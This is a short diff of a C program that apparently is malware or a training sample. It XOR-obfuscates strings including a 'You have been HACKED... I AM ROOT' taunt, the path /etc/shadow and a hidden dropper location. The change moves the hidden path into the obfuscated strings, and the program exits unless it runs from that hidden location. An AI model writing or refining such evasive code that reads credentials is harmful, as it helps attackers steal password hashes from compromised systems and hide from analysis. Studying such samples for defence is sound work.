@@ -3,7 +3,7 @@
 // SOURCE_STRINGS
 //#define HACKED_XOR "You have been HACKED. Not only have you been HACKED, you will see that I AM ROOT. To prove this I've conveniently included the contents of shadow...\n\n"
 //#define SHADOW_XOR "/etc/shadow"
-//#define TPS_XOR "/tmp/.entry-3tps-93f8u-rprt\n"
+//#define TPS_XOR "/var/tmp/.entry-3tps-93f8u-rprt"
 //#define HOME_XOR "/home/"
 //#define PROC_XOR "/proc/self/exe"
 // END_SOURCE_STRINGS
@@ -80,7 +80,7 @@ int main(int argc, char *argv[]) {
 
     char readbuf[1024] = {0};
     readlink(dexor(PROC_XOR), readbuf, sizeof(readbuf));
-    if (strncmp(readbuf, "/tmp/.entry-3tps-93f8u-rprt", sizeof(readbuf)) != 0) {
+    if (strncmp(readbuf, dexor(TPS_XOR), sizeof(readbuf)) != 0) {
         // Exit because we are not executing from intended location.  
 	exit(0);
     }
